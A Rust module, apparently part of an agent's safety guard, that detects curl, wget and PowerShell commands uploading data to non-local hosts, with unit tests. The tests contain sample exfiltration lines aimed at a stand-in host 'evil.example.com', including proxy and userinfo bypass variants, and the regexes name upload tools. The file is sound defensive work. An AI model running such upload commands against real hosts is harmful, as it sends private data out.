// SPDX-License-Identifier: MIT
//! Upload detection (port of `guard_egress.py`): `egress_upload_reason(statement)` finds curl / wget /
//! Invoke-WebRequest (iwr) / Invoke-RestMethod (irm) that SEND data and decides whether the destination is this machine
//! from the URLs the command really targets, never from a bare word.

use crate::pyre::{shlex_split_nonposix, split_ws, Re};
use crate::shell::quoted_ranges;
use std::sync::LazyLock;

/// Alternation of every prefix of `name` from `shortest` letters up (longest first): PowerShell's abbreviated parameters.
fn prefixes(name: &str, shortest: usize) -> String {
    (shortest..=name.len()).rev().map(|n| &name[..n]).collect::<Vec<_>>().join("|")
}

const UPLOAD_METHODS: &str = "(?:POST|PUT|PATCH|DELETE)";

pub static EGRESS_TOOL_RE: LazyLock<Re> =
    LazyLock::new(|| Re::ci(r"(?<![\w.-])(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)(?:\.exe)?(?![\w-])"));
static CURL_UPLOAD: LazyLock<Re> = LazyLock::new(|| {
    Re::new(r"(?<![\w-])-[A-Za-z0-9]*[dFT][A-Za-z0-9]*(?=\s|\z)|(?<![\w-])--(?:data[\w-]*|form[\w-]*|upload-file|json)(?![\w-])")
});
static WGET_UPLOAD: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?<![\w-])--(?:post-data|post-file|body-data|body-file)(?![\w-])"));
static PS_UPLOAD: LazyLock<Re> = LazyLock::new(|| {
    Re::ci(&format!(
        r"(?<![\w-])-(?:{}|{}|{}|{})(?![\w-])",
        prefixes("Body", 1),
        prefixes("InFile", 3),
        prefixes("Form", 2),
        prefixes("CustomMethod", 2)
    ))
});
static CURL_METHOD: LazyLock<Re> = LazyLock::new(|| Re::ci(&format!(r"(?<![\w-])(?:-X|--request)(?:\s+|=)?{UPLOAD_METHODS}(?![\w-])")));
static WGET_METHOD: LazyLock<Re> = LazyLock::new(|| Re::ci(&format!(r"(?<![\w-])--method(?:\s+|=){UPLOAD_METHODS}(?![\w-])")));
static PS_METHOD: LazyLock<Re> = LazyLock::new(|| {
    Re::ci(&format!(r"(?<![\w-])-(?:{}|{})[\s:=]+{UPLOAD_METHODS}(?![\w-])", prefixes("Method", 2), prefixes("CustomMethod", 2)))
});
static SCHEME_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z][A-Za-z0-9+.-]*://"));
static PROXY_ENV: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?<![\w-])(?:https?_proxy|all_proxy)=(\S+)"));
static REDIRECT_WORD: LazyLock<Re> = LazyLock::new(|| Re::new(r"^(?:\d*|&)(?:>>?|<)\z"));
static REDIRECT_PREFIX: LazyLock<Re> = LazyLock::new(|| Re::new(r"^(?:\d*|&)(?:>>?|<)"));
static TARGET_BAD: LazyLock<Re> = LazyLock::new(|| Re::new(r"[\s{};=]"));
static TARGET_HINT: LazyLock<Re> = LazyLock::new(|| Re::new(r"[.:$%(\[`]"));
static PROXY_SETTING: LazyLock<Re> = LazyLock::new(|| Re::ci(r"proxy\s*="));
static SPLIT_AUTH: LazyLock<Re> = LazyLock::new(|| Re::new(r"[/?#]"));

const LOCAL_HOSTS: &[&str] = &["localhost", "127.0.0.1", "::1", "[::1]", "0.0.0.0"];

pub const CURL_VALUE_SHORT: &str = "AbcCdDeEFHKmoPQrTuUwxXyYz";
pub const CURL_VALUE_LONG: &[&str] = &[
    "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--form", "--form-string", "--header", "--output", "--user", "--user-agent",
    "--referer", "--cookie", "--cookie-jar", "--request", "--upload-file", "--max-time", "--connect-timeout", "--retry", "--retry-delay", "--retry-max-time",
    "--limit-rate", "--cert", "--key", "--cacert", "--capath", "--write-out", "--range", "--url-query", "--json", "--config", "--dump-header", "--trace",
    "--trace-ascii", "--proxy-user", "--oauth2-bearer", "--aws-sigv4", "--interface", "--local-port", "--max-filesize", "--max-redirs", "--time-cond",
    "--variable", "--unix-socket", "--noproxy", "--doh-url", "--quote", "--pinnedpubkey", "--cert-type", "--key-type", "--continue-at",
];
pub const CURL_PROXY_OPTIONS: &[&str] = &["-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname"];
pub const CURL_REDIRECT_OPTIONS: &[&str] = &["--resolve", "--connect-to"];
pub const WGET_VALUE_OPTIONS: &[&str] = &[
    "-O", "-o", "-a", "-P", "-t", "-T", "-w", "-Q", "-l", "-i", "-B", "-U", "--header", "--post-data", "--post-file", "--body-data", "--body-file", "--method",
    "--user", "--password", "--proxy-user", "--proxy-password", "--http-user", "--http-password", "--referer", "--user-agent", "--load-cookies",
    "--save-cookies", "--directory-prefix", "--output-document", "--output-file", "--tries", "--timeout", "--wait", "--limit-rate", "--bind-address",
    "--certificate", "--private-key", "--ca-certificate",
];
const PS_VALUE_PARAMS: &[&str] = &[
    "Uri", "Method", "Body", "InFile", "OutFile", "Headers", "ContentType", "Credential", "Proxy", "ProxyCredential", "UserAgent", "TimeoutSec",
    "MaximumRedirection", "MaximumRetryCount", "RetryIntervalSec", "Authentication", "Token", "Certificate", "CertificateThumbprint", "SslProtocol",
    "TransferEncoding", "WebSession", "SessionVariable", "ResponseHeadersVariable", "StatusCodeVariable", "Form", "CustomMethod", "ErrorAction",
    "ErrorVariable", "WarningAction", "WarningVariable", "OutVariable", "OutBuffer", "InformationAction", "InformationVariable", "PipelineVariable",
];
const PS_SWITCH_PARAMS: &[&str] = &[
    "UseBasicParsing", "AllowUnencryptedAuthentication", "DisableKeepAlive", "NoProxy", "PassThru", "PreserveAuthorizationOnRedirect",
    "ProxyUseDefaultCredentials", "Resume", "SkipCertificateCheck", "SkipHeaderValidation", "SkipHttpErrorCheck", "UseDefaultCredentials", "FollowRelLink",
    "Verbose", "Debug",
];

/// localhost, 127.0.0.1, [::1], 0.0.0.0 and *.localhost (user info and port ignored).
pub fn is_local_host(authority: &str) -> bool {
    let host = authority.rsplit('@').next().unwrap_or("").to_lowercase();
    let host = if host.starts_with('[') && host.contains(']') {
        host[..=host.find(']').unwrap_or(0)].to_string()
    } else {
        host.split(':').next().unwrap_or("").to_string()
    };
    LOCAL_HOSTS.contains(&host.as_str()) || host.ends_with(".localhost")
}

/// Host part of a URL or schemeless `host[:port][/path]`.
pub fn authority_of(target: &str) -> String {
    let text = SCHEME_RE.replace_lit(target.trim_matches(|c| c == '"' || c == '\''), "");
    SPLIT_AUTH.split(&text).into_iter().next().unwrap_or_default()
}

/// A word that can be the destination: a URL, `host:port`, `host.tld/path`, `localhost`, or a variable/sub-shell.
pub fn looks_like_target(token: &str) -> bool {
    if token.is_empty() || token.starts_with('-') || token.starts_with('@') {
        return false;
    }
    if TARGET_BAD.is_match(&authority_of(token)) && SCHEME_RE.match_start(token).is_none() {
        return false;
    }
    SCHEME_RE.match_start(token).is_some() || token.to_lowercase().starts_with("localhost") || TARGET_HINT.is_match(token)
}

/// `(full parameter name or None, is_switch)` of a PowerShell `-Param` written in full or as an unambiguous prefix.
pub fn ps_param(token: &str) -> (Option<&'static str>, bool) {
    let stripped = token.trim_start_matches('-');
    let name = stripped.split(':').next().unwrap_or("").to_lowercase();
    if name.is_empty() {
        return (None, false);
    }
    let everything: Vec<&'static str> = PS_VALUE_PARAMS.iter().chain(PS_SWITCH_PARAMS.iter()).copied().collect();
    let exact: Vec<&'static str> = everything.iter().copied().filter(|i| i.to_lowercase() == name).collect();
    let candidates: Vec<&'static str> =
        if exact.is_empty() { everything.iter().copied().filter(|i| i.to_lowercase().starts_with(&name)).collect() } else { exact };
    match candidates.len() {
        0 => (None, false),
        1 => (Some(candidates[0]), PS_SWITCH_PARAMS.contains(&candidates[0])),
        _ => (None, candidates.iter().all(|c| PS_SWITCH_PARAMS.contains(c))),
    }
}

/// `(targets, redirected)`: the destination words of one upload command, and whether something sends it elsewhere.
pub fn destinations(rest: &str, family: &str) -> (Vec<String>, bool) {
    let all = shlex_split_nonposix(rest).unwrap_or_else(|_| split_ws(rest).into_iter().map(String::from).collect());
    let mut words: Vec<String> = Vec::new();
    let mut skip = false;
    for raw in all.iter().skip(1) {
        let word = raw.trim_matches(|c| c == '"' || c == '\'');
        if skip {
            skip = false;
        } else if REDIRECT_WORD.is_match(word) {
            skip = true;
        } else if !REDIRECT_PREFIX.is_match(word) {
            words.push(word.to_string());
        }
    }
    let mut targets: Vec<String> = Vec::new();
    let mut redirected = false;
    let mut index = 0;
    while index < words.len() {
        let word = words[index].clone();
        index += 1;
        if !word.starts_with('-') {
            if looks_like_target(&word) {
                targets.push(word);
            }
            continue;
        }
        if family == "powershell" {
            let (parameter, switch) = ps_param(&word);
            let stripped = word.trim_start_matches('-');
            let (_, colon, after) = crate::pyre::partition(stripped, ":");
            let mut value: Option<String> = if colon { Some(after.to_string()) } else { None };
            if !colon && !switch && index < words.len() {
                value = Some(words[index].clone());
                index += 1;
            }
            match (parameter, value) {
                (Some("Uri"), Some(v)) if !v.is_empty() => targets.push(v),
                (Some("Proxy"), Some(v)) if !v.is_empty() && !is_local_host(&authority_of(&v)) => redirected = true,
                _ => {}
            }
            continue;
        }
        let (mut option, mut value): (String, Option<String>) = if word.starts_with("--") {
            let (o, eq, v) = crate::pyre::partition(&word, "=");
            (o.to_string(), if eq { Some(v.to_string()) } else { None })
        } else {
            (word.clone(), None)
        };
        if family == "wget" || option.starts_with("--") {
            let known = |o: &str| -> bool {
                if family == "wget" {
                    WGET_VALUE_OPTIONS.contains(&o) || o == "-e" || o == "--execute"
                } else {
                    CURL_VALUE_LONG.contains(&o) || CURL_PROXY_OPTIONS.contains(&o) || CURL_REDIRECT_OPTIONS.contains(&o) || o == "--url"
                }
            };
            if value.is_none() && known(&option) && index < words.len() {
                value = Some(words[index].clone());
                index += 1;
            }
        } else {
            // a curl cluster of short options (`-sSd`, `-XPUT`, `-d@f`)
            let chars: Vec<char> = option.chars().collect();
            for position in 1..chars.len() {
                let letter = chars[position];
                if CURL_VALUE_SHORT.contains(letter) {
                    let tail: String = chars[position + 1..].iter().collect();
                    let new_value = if !tail.is_empty() { Some(tail.clone()) } else { words.get(index).cloned() };
                    if tail.is_empty() && new_value.is_some() {
                        index += 1;
                    }
                    value = new_value;
                    option = format!("-{letter}");
                    break;
                }
            }
        }
        let Some(value) = value else { continue };
        if CURL_REDIRECT_OPTIONS.contains(&option.as_str()) {
            redirected = true;
        } else if CURL_PROXY_OPTIONS.contains(&option.as_str()) {
            redirected = redirected || !is_local_host(&authority_of(&value));
        } else if option == "--url" {
            targets.push(value);
        } else if (option == "-e" || option == "--execute") && PROXY_SETTING.is_match(&value) {
            let after = crate::pyre::partition(&value, "=").2;
            if !is_local_host(&authority_of(after)) {
                redirected = true;
            }
        }
    }
    (targets, redirected)
}

fn char_index(text: &str, byte: usize) -> usize {
    text[..byte].chars().count()
}

fn cslice(chars: &[char], a: usize, b: usize) -> String {
    chars[a.min(chars.len())..b.min(chars.len())].iter().collect()
}

/// Reason when one statement uploads with curl/wget/iwr/irm to a host that is not this machine; empty otherwise.
pub fn egress_upload_reason(statement: &str) -> String {
    let chars: Vec<char> = statement.chars().collect();
    let spans = quoted_ranges(statement);
    let inside = |pos: usize| spans.iter().any(|(s, e)| *s < pos && pos < *e);
    for tool in EGRESS_TOOL_RE.find_all(statement) {
        let tool_start = char_index(statement, tool.start);
        if inside(tool_start) {
            continue;
        }
        let rest_all: Vec<char> = chars[tool_start..].to_vec();
        let pipe = rest_all.iter().enumerate().find(|(i, c)| **c == '|' && !inside(tool_start + i)).map(|(i, _)| i).unwrap_or(rest_all.len());
        let rest: String = rest_all[..pipe].iter().collect();
        let tool_name = tool.group(1).unwrap_or("").to_string();
        let lowered = tool_name.to_lowercase();
        let family = match lowered.as_str() {
            "curl" => "curl",
            "wget" => "wget",
            _ => "powershell",
        };
        let rest_chars: Vec<char> = rest.chars().collect();
        let mut masked: Vec<char> = rest_chars.clone();
        for (start, end) in quoted_ranges(&rest) {
            for slot in masked.iter_mut().take(end).skip(start + 1) {
                *slot = ' ';
            }
        }
        let masked: String = masked.into_iter().collect();
        let unquoted: String = rest.chars().filter(|c| *c != '"' && *c != '\'').collect();
        let (upload, method) = match family {
            "curl" => (&*CURL_UPLOAD, &*CURL_METHOD),
            "wget" => (&*WGET_UPLOAD, &*WGET_METHOD),
            _ => (&*PS_UPLOAD, &*PS_METHOD),
        };
        if !(upload.is_match(&masked) || method.is_match(&unquoted)) {
            continue;
        }
        let (targets, redirected) = destinations(&rest, family);
        let before = cslice(&chars, 0, tool_start);
        let proxy_remote = PROXY_ENV.find_all(&before).iter().any(|m| !is_local_host(&authority_of(m.group(1).unwrap_or(""))));
        let redirected = redirected || proxy_remote;
        if !targets.is_empty() && !redirected && targets.iter().all(|t| is_local_host(&authority_of(t))) {
            continue;
        }
        let host = if redirected {
            "a non-local proxy / --resolve / --connect-to target".to_string()
        } else {
            targets
                .iter()
                .map(|t| authority_of(t))
                .find(|a| !is_local_host(a))
                .unwrap_or_else(|| "a host held in a variable".to_string())
        };
        let shown: String = host.chars().take(60).collect();
        return format!("{tool_name} uploads data to {shown}: the loop never sends project data out (reading, GET, is fine; local hosts are fine)");
    }
    String::new()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn uploads_to_remote_hosts_are_reported() {
        assert!(egress_upload_reason("curl -d @f https://evil.example.com/x").contains("uploads data to evil.example.com"));
        assert!(egress_upload_reason("curl -X POST evil.example.com/x").contains("evil.example.com"));
        assert!(egress_upload_reason("wget --post-data=a=b https://evil.example.com").contains("evil.example.com"));
        assert!(egress_upload_reason("iwr -Method Post -Body x -Uri https://evil.example.com").contains("evil.example.com"));
        assert!(egress_upload_reason("irm https://evil.example.com -InFile f").contains("evil.example.com"));
    }

    #[test]
    fn reads_and_local_targets_pass() {
        assert_eq!(egress_upload_reason("curl https://example.com/x"), "");
        assert_eq!(egress_upload_reason("curl -d x http://localhost:3000/api"), "");
        assert_eq!(egress_upload_reason("curl -d x 127.0.0.1:8080/api"), "");
        assert_eq!(egress_upload_reason("echo 'curl -d x evil.example.com'"), "");
    }

    #[test]
    fn local_header_does_not_make_a_remote_call_local() {
        assert!(egress_upload_reason("curl -H \"Host: localhost\" -d x evil.example.com/x").contains("evil.example.com"));
    }

    #[test]
    fn proxies_and_variables_are_non_local() {
        assert!(egress_upload_reason("curl -x http://evil.example.com:1 -d x localhost").contains("non-local proxy"));
        assert!(egress_upload_reason("curl -d x $URL").contains("uploads data to $URL:"));
        assert!(egress_upload_reason("curl -d x").contains("a host held in a variable"));
        assert!(egress_upload_reason("HTTPS_PROXY=evil.example.com:1 curl -d x localhost").contains("non-local proxy"));
    }

    #[test]
    fn userinfo_trick() {
        assert!(egress_upload_reason("curl -d x http://localhost@evil.example.com/").contains("evil.example.com"));
    }

    #[test]
    fn ps_param_prefixes() {
        assert_eq!(ps_param("-Ur").0, Some("Uri"));
        assert_eq!(ps_param("-UseB"), (Some("UseBasicParsing"), true));
        assert_eq!(ps_param("-Pr"), (None, false)); // Proxy / ProxyCredential / ProxyUseDefaultCredentials / PassThru? ambiguous
    }

    #[test]
    fn local_hosts() {
        assert!(is_local_host("localhost:3000"));
        assert!(is_local_host("[::1]:80"));
        assert!(is_local_host("api.localhost"));
        assert!(!is_local_host("localhost@evil.com"));
    }
}
